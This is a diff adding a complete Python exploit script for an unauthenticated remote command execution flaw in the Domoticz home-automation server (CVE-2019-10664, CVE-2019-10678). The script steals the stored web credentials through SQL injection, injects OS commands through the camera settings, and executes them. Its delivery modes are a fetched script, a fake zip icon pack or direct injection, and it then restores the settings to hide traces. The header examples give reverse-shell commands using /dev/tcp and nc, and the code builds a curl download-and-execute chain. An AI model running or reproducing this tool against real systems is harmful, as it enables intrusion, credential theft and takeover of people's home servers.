@@ -1,0 +1,219 @@
+#!/usr/bin/env python
+#-*- coding: utf-8 -*-
+# Exploit Title: Unauthenticated Remote Command Execution on Domoticz <= 4.10577
+# Date: April 2019
+# Exploit Author: Fabio Carretto @ Certimeter Group
+# Vendor Homepage: https://www.domoticz.com/
+# Software Link: https://www.domoticz.com/downloads/
+# Version: Domoticz <= 4.10577
+# Tested on: Debian 9
+# CVE: CVE-2019-10664, CVE-2019-10678
+# ====================================================================
+# Bypass authentication, inject commands and execute them
+# Required login page or no authentication (doesn't work with "Basic-Auth" setting)
+# There are 3 injection modes. The 1st and the 2nd bypass the char filter:
+# 1.Default mode insert the commands in a script and reply with it once to
+#   an HTTP request. Set address and port of the attacker host with -H and -P
+# 2.(-zipcmd) a zip icon pack will be uploaded. The domoticz installation path
+#   can be optionally specified with -path /opt/domoti..
+# 3.(-direct) commands executed directly. Characters like & pipe or redirection
+#   cannot be used. The execution may block domoticz web server until the end
+# Examples:
+# ./exploit.py -H 172.17.0.1 -P 2222 http://172.17.0.2:8080/ 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1 &'
+# ./exploit.py -zipcmd http://localhost:8080/ 'nc 10.0.2.2 4444 -e /bin/bash &'
+
+import argparse
+import requests
+import urllib
+import base64
+import json
+import BaseHTTPServer
+import zipfile
+import thread
+
+# Retrieve data from db with the SQL Injection on the public route
+def steal_dbdata(field):
+    sqlinj = sqlpref % field
+    urltmp = url_sqlinj + sqlinj
+    r = session.get(urltmp)
+    print '[+] %s: %s' % (field,r.text)
+    return r.text
+
+# Login and return the SID cookie
+def dologin(username, password):
+    url_login_cred = url_login % (username, password)
+    r = session.get(url_login_cred)
+    sid = r.headers['Set-Cookie']
+    sid = sid[sid.find('SID=')+4 : sid.find(';')]
+    print '[+] SID=' + sid
+    return sid
+
+# Search an uvc cam. If exists return its json config
+def get_uvc_cam():
+    r = session.get(url_camjson)
+    cams = json.loads(r.text)
+    if cams['status'] == 'OK' and 'result' in cams:
+        for cam in cams['result']:
+            if cam['ImageURL']=='uvccapture.cgi':
+                return cam
+    return None
+
+# Prompt the user and ask if continue or not
+def prompt_msg(msg):
+    print '[+] WARNING: ' + msg
+    if not args.f and not raw_input('[+] Continue? [y/N]: ') in ["y","Y"]:
+        exit(0)
+    return None
+
+# Embed the commands in a zip icon file (-zipcmd)
+def create_zip(commandsline):
+    zipname = 'iconpackfake.zip'
+    with zipfile.ZipFile(zipname, 'w') as zip:
+        zip.writestr('icons.txt', "fakeicon;Button fakeicon;fake")
+        zip.writestr('fakeicon.png', commandsline)
+        zip.writestr('fakeicon48_On.png', commandsline)
+        zip.writestr('fakeicon48_Off.png', commandsline)
+    return zipname
+
+# HTTP server that reply once with the content of the script
+class SingleHandler(BaseHTTPServer.BaseHTTPRequestHandler):
+    respbody = ""
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        self.wfile.write(self.respbody)
+        return None
+    def log_request(self, code):
+        pass
+
+#--------------------------------------------------------------------
+# INITIALIZATION
+#--------------------------------------------------------------------
+parser = argparse.ArgumentParser(
+    description="""Unauthenticated Remote Command Execution on Domoticz!
+    (version <= 4.10577) Bypass authentication, inject os commands and execute them!""",
+    epilog="""The default mode (1) insert the commands in a script and reply 
+    with it once to an HTTP request, use -H address and -P port.
+    The -zipcmd (2) or -direct (3) option override the default mode.""")
+parser.add_argument('-noexec', action='store_true', help='no cmd injection, just steal credentials')
+parser.add_argument('-zipcmd', action='store_true', help='upload a zip icon pack with commands inside (2)')
+parser.add_argument('-direct', action='store_true', help='inject commands directly in uvc params (3)')
+parser.add_argument('-H', dest='lhost', type=str, help='address/name of attacker host in default mode (1)')
+parser.add_argument('-P', dest='lport', type=int, help='tcp port of attacker host in default mode (1)')
+parser.add_argument('-path', dest='path', type=str, default='/src/domoticz',
+    help='change root path of domoticz to find the uploaded icon(script). Useful only with -zipcmd option')
+parser.add_argument('-f', action='store_true', help='shut up and do it')
+parser.add_argument('url', metavar='URL', nargs=1, type=str, help='target URL e.g.: http://localhost:8080/')
+parser.add_argument('cmd', metavar='cmd', nargs='+', type=str, help='os command to execute, '
+    'send it in background or do a short job, the domoticz web server will hang during execution')
+args  = parser.parse_args()
+if not(args.direct or args.zipcmd) and (args.lhost is None or args.lport is None):
+    print '[-] Default mode needs host (-H) and port (-P) of attacker to download the commands'
+    exit(0)
+username = ''
+password = ''
+cookies = dict()
+noauth  = True
+sqlpref = 'UNION SELECT sValue FROM Preferences WHERE Key="%s" -- '
+cmd = args.cmd
+url = args.url[0][:-1] if args.url[0][-1]=='/' else args.url[0]
+url_sqlinj  = url + '/images/floorplans/plan?idx=1 '
+url_login   = url + '/json.htm?type=command&param=logincheck&username=%s&password=%s&rememberme=true'
+url_getconf = url + '/json.htm?type=settings'
+url_setconf = url + '/storesettings.webem'
+url_iconupl = url + '/uploadcustomicon'
+url_camjson = url + '/json.htm?type=cameras'
+url_camlive = url + '/camsnapshot.jpg?idx='
+url_camadd  = url + '/json.htm?type=command&param=addcamera&address=127.0.0.1&port=8080' \
+    '&name=uvccam&enabled=true&username=&password=&imageurl=dXZjY2FwdHVyZS5jZ2k%3D&protocol=0'
+cmd_zipicon = ['chmod 777 %s/www/images/fakeicon48_On.png' % args.path,
+    '%s/www/images/fakeicon48_On.png' % args.path]
+cmd_default = ['curl %s -o /tmp/myexec.sh -m 5', 'chmod 777 /tmp/myexec.sh', '/tmp/myexec.sh']
+
+#--------------------------------------------------------------------
+# AUTHENTICATION BYPASS
+#--------------------------------------------------------------------
+session = requests.Session()
+r = session.get(url_getconf)
+if r.status_code == 401:
+    noauth = False
+    username = steal_dbdata('WebUserName')
+    password = steal_dbdata('WebPassword')
+    cookies['SID'] = dologin(username, password)
+    r = session.get(url_getconf)
+if args.noexec is True:
+    exit(0)
+settings = json.loads(r.text)
+settings.pop('UVCParams', None)
+#--------------------------------------------------------------------
+# Fix necessary to not break or lose settings
+chn = {'WebTheme':'Themes','UseAutoBackup':'enableautobackup','UseAutoUpdate':'checkforupdates'}
+for k in chn:
+    settings[chn[k]] = settings.pop(k, None)
+sub = settings.pop('MyDomoticzSubsystems', 0)
+if sub >= 4:
+    settings['SubsystemApps'] = 4; sub -= 4
+if sub >= 2:
+    settings['SubsystemShared'] = 2; sub -= 2
+if sub == 1:
+    settings['SubsystemHttp'] = 1  
+try:    
+    settings['HTTPURL'] = base64.b64decode(settings['HTTPURL'])
+    settings['HTTPPostContentType'] = base64.b64decode(settings['HTTPPostContentType'])
+    settings['Latitude'] = settings['Location']['Latitude']
+    settings['Longitude'] = settings['Location']['Longitude']
+    settings.pop('Location', None)
+except:
+    pass
+toOn  = ['allow','accept','hide','enable','disable','trigger','animate','show']
+toOn += ['usee','floorplanfullscreen','senderrorsasn','emailasa','checkforupdates']
+for k in [x for x in settings if any([y for y in toOn if y in x.lower()])]:
+    if(str(settings[k]) == '1'):
+        settings[k] = 'on'
+    elif(str(settings[k]) == '0'):
+        settings.pop(k, None)
+
+#--------------------------------------------------------------------
+# COMMAND INJECTION
+#--------------------------------------------------------------------
+cmdwrap = '\n'.join(['#!/bin/bash'] + cmd)
+payload = urllib.urlencode(settings) + '&'
+if cmd[-1][-1] != '&' and not args.direct:
+    prompt_msg('if not sent in background the commands may block domoticz')
+if args.direct:
+    prompt_msg('in direct mode & pipe redirect are not allowed (may block domoticz)')
+elif args.zipcmd:
+    fakezip = create_zip(cmdwrap)
+    files = [('file',(fakezip, open(fakezip,'rb'), 'application/zip'))]
+    r = session.post(url_iconupl, files=files)
+    cmd = cmd_zipicon
+else:
+    httpd = BaseHTTPServer.HTTPServer(("", args.lport), SingleHandler)
+    SingleHandler.respbody = cmdwrap
+    thread.start_new_thread(httpd.handle_request, ())
+    cmd_default[0] = cmd_default[0] % ('http://%s:%d/' % (args.lhost,args.lport))
+    cmd = cmd_default
+# Encode the space and send the others in clear (chars like <>&;| not allowed)
+cmdencode = '\n'.join([x.replace(' ', '+') for x in cmd])
+payload += 'UVCParams=-d+/dev/aaa\n%s\n#' % (cmdencode)
+req = requests.Request('POST', url_setconf, data=payload, cookies=cookies)
+r = session.send(req.prepare())
+print '[+] Commands successfully injected'
+
+#--------------------------------------------------------------------
+# COMMAND EXECUTION
+#--------------------------------------------------------------------
+if noauth:
+    session.cookies.clear() # fix if authentication is disabled
+cam = get_uvc_cam()
+if cam is None:
+    print '[+] Adding new UVC camera'
+    r = session.get(url_camadd)
+    cam = get_uvc_cam()
+print '[+] Execution on cam with idx: ' + str(cam['idx'])
+r = session.get(url_camlive + str(cam['idx']))
+# Restore the default UVC parameters (like a ninja)
+settings['UVCParams'] = '-S80 -B128 -C128 -G80 -x800 -y600 -q100'
+session.post(url_setconf, data=settings)
+print '[+] Done! Restored default uvc params!'
